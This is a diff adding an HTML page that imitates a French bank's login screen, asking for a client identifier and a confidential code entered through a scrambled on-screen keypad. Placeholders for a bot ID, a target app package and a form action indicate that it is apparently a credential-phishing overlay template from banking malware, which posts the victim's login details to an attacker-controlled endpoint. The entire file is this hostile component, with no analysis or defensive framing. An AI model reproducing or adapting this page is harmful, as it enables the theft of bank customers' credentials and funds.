@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title></title>
+	<style type='text/css'>
+	* {
+		margin: 0;
+		padding: 0;
+		font-size: 14pt;
+	}
+	
+	body {
+		background-color: #eee;
+		color: #444;
+	}
+	
+	#header {
+		border-bottom: 1px solid #eee;
+		padding: 10px;
+	}
+	
+	.button1 {
+		font-weight: bold;
+		padding: 20px;
+		width: 100%;
+		
+		color: black;
+		background-color: white;
+		border: 0;
+		border-radius: 5px; 
+	}
+	
+	
+	#body {
+		width: 100%;
+	}
+	#body TD {
+		padding: 10px;
+	}
+	
+	INPUT {
+		border: 0;
+		background-color: transparent;
+		width: 100%;
+	}
+
+	#loginbutton {
+		width: 100%;
+		color: white;
+		font-weight: bold;
+		padding: 10px;
+		border-radius: 3px;
+		background-color: #757575;
+	}
+
+	#clearbutton {
+		width: 100%;
+		color: white;
+		font-weight: bold;
+		padding: 10px;
+		border-radius: 3px;
+		background-color: #d60004;
+	}
+	
+	.inp {
+		border: 1px solid #e2e9f1;
+		border-radius: 3px;
+		padding: 10px;
+		width: calc(100% - 20px);
+		background-color: #fff;
+		color: #818181;
+	}
+	
+	#numertable TD {
+		text-align: center;
+		font-size: 22px;
+		
+		background: #ffffff; /* Old Browsers */
+		background: -webkit-linear-gradient(top,#ffffff,#f0f0f0); /*Safari 5.1-6*/
+		background: -o-linear-gradient(top,#ffffff,#f0f0f0); /*Opera 11.1-12*/
+		background: -moz-linear-gradient(top,#ffffff,#f0f0f0); /*Fx 3.6-15*/
+		background: linear-gradient(to bottom, #ffffff, #f0f0f0); /*Standard*/
+	}
+	</style>
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+
+</head>
+
+<body>
+<div id='body'>	
+	<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+		
+	<table border='0' width='100%' style='margin: 0 auto;' cellpadding=0 cellspacing=0>
+	<tr><td style='padding: 0; background-color: #f2f2f2; padding: 10px; font-size: 16pt; text-align: center; font-weight: bold'>
+		<img src='%DYN_PATH%/img/logo.png' width='300px' /><br />
+		Identification
+</td></tr>
+	</table>
+	
+	<table border='0' width='90%'  style='margin: 0 auto' id='step1' cellpadding=0 cellspacing=0>
+		<tr>
+			<td>Identification client<br /><input class='inp' type='number' id='field1' name='fields[client]' value='' placeholder='' />
+			<br /><br />Mémoriser mon identifiant client <div style='font-size: 16pt; display: inline-block; border: 0px solid #444; border-radius: 3px; margin-left: 10px; width: 15px; height: 15px' id='rememberme' onclick='return function(el){  $("#rememberme").html("&#9745;");        }()'>&#9744;</div>
+			</td></tr>
+		<tr>
+			<td>Code confidentiel<br /><input class='inp' type='password' id='field2' name='fields[password]' readonly value='' placeholder='' /></td></tr>
+	</table>
+
+	<table border='0' width='90%' style='margin: 0 auto;'>
+	<tr><td style='text-align: right; width: 50%'>
+		<input id='clearbutton' class='button' type='button' onclick='return function(){ $("#field1").val(""); $("#field2").val(""); $("#rememberme").html("&#9744;"); }()' value='Effacer' />
+	</td>
+	<td style='text-align: left'><input id='loginbutton' class='button' type='submit' value='Valider' /></td>
+	</tr>
+	</table>
+	
+
+	<table border='0' width='90%' style='margin: 0 auto;' cellspacing='5' id='numertable'>
+		<tr>
+			<td onclick='$("#field2").val($("#field2").val() + "1")'>1</td>
+			<td onclick='$("#field2").val($("#field2").val() + "6")'>6</td>
+			<td onclick='$("#field2").val($("#field2").val() + "3")'>3</td>
+			<td onclick='$("#field2").val($("#field2").val() + "8")'>8</td>
+			<td onclick='$("#field2").val($("#field2").val() + "7")'>7</td>
+		</tr>
+		<tr>
+			<td onclick='$("#field2").val($("#field2").val() + "0")'>0</td>
+			<td onclick='$("#field2").val($("#field2").val() + "4")'>4</td>
+			<td onclick='$("#field2").val($("#field2").val() + "5")'>5</td>
+			<td onclick='$("#field2").val($("#field2").val() + "9")'>9</td>
+			<td onclick='$("#field2").val($("#field2").val() + "2")'>2</td>
+		</tr>
+	</table>
+
+	
+	</form>
+</div>
+
+</body>
+</html>
+
+
+
+
